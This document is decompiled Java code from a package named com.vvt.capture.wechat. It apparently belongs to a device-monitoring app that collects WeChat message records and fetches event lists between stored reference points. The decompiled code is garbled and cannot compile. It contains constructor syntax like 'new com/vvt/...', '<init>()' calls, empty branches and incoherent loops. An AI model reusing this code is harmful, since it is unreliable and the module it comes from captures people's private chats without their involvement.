package com.vvt.capture.wechat.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class i
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.d;
  private long d = 0L;
  private String e;
  private String f;
  private String g;
  private com.vvt.base.b h;
  
  public i(String paramString1, String paramString2, String paramString3, com.vvt.base.b paramb)
  {
    this.e = paramString1;
    this.f = paramString2;
    this.g = paramString3;
    this.h = paramb;
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    for (;;)
    {
      try
      {
        Object localObject = com.vvt.capture.wechat.b.a();
        boolean bool3 = com.vvt.ag.b.a((String)localObject);
        if (!bool3)
        {
          String str1 = this.e;
          String str2 = this.f;
          String str3 = this.g;
          long l2 = com.vvt.capture.wechat.b.a(str1, (String)localObject, str2, str3);
          bool1 = false;
          localObject = null;
          l3 = l2;
          int j = 0;
          str2 = null;
          boolean bool4 = l3 < l1;
          if (!bool4)
          {
            int k = 5;
            if (j < k)
            {
              bool1 = a;
              if (bool1) {}
              l3 = 2000L;
              SystemClock.sleep(l3);
              localObject = com.vvt.capture.wechat.b.a();
              str1 = this.e;
              str3 = this.f;
              String str4 = this.g;
              long l4 = com.vvt.capture.wechat.b.a(str1, (String)localObject, str3, str4);
              int i = j + 1;
              j = i;
              l3 = l4;
              continue;
            }
          }
        }
        else
        {
          l3 = l1;
        }
        boolean bool5 = l3 < l1;
        if (bool5) {
          continue;
        }
        bool2 = b;
        if (bool2) {}
        l3 = this.d;
        localObject = Long.valueOf(l3);
        localFxSimpleEventReference.setReference((Long)localObject);
      }
      catch (Exception localException)
      {
        long l3;
        boolean bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      this.d = l3;
    }
  }
  
  public List a(int paramInt)
  {
    l1 = -1;
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      str1 = com.vvt.capture.wechat.b.a();
      if (str1 == null) {
        break label185;
      }
      localObject = this.e;
      str2 = this.f;
      String str3 = this.g;
      l2 = com.vvt.capture.wechat.b.a((String)localObject, str1, str2, str3);
      localObject = this.e;
      str2 = this.f;
      str3 = this.g;
      long l3 = com.vvt.capture.wechat.b.a(paramInt, (String)localObject, str1, str2, str3);
      long l4 = 1L;
      l1 = l3 - l4;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        String str1;
        Object localObject;
        String str2;
        long l2;
        String str4;
        com.vvt.base.b localb;
        bool = c;
        if (bool)
        {
          continue;
          l2 = l1;
        }
      }
    }
    localObject = this.e;
    str2 = this.f;
    str4 = this.g;
    localb = this.h;
    localObject = com.vvt.capture.wechat.b.a((String)localObject, str1, str2, l1, l2, str4, localb);
    localArrayList.addAll((Collection)localObject);
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      String str1 = com.vvt.capture.wechat.b.a();
      bool = com.vvt.ag.b.a(str1);
      if (!bool)
      {
        localObject = this.e;
        String str2 = this.f;
        String str3 = this.g;
        com.vvt.base.b localb = this.h;
        localObject = com.vvt.capture.wechat.b.a((String)localObject, str1, str2, l1, l2, str3, localb);
        localArrayList.addAll((Collection)localObject);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/a/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */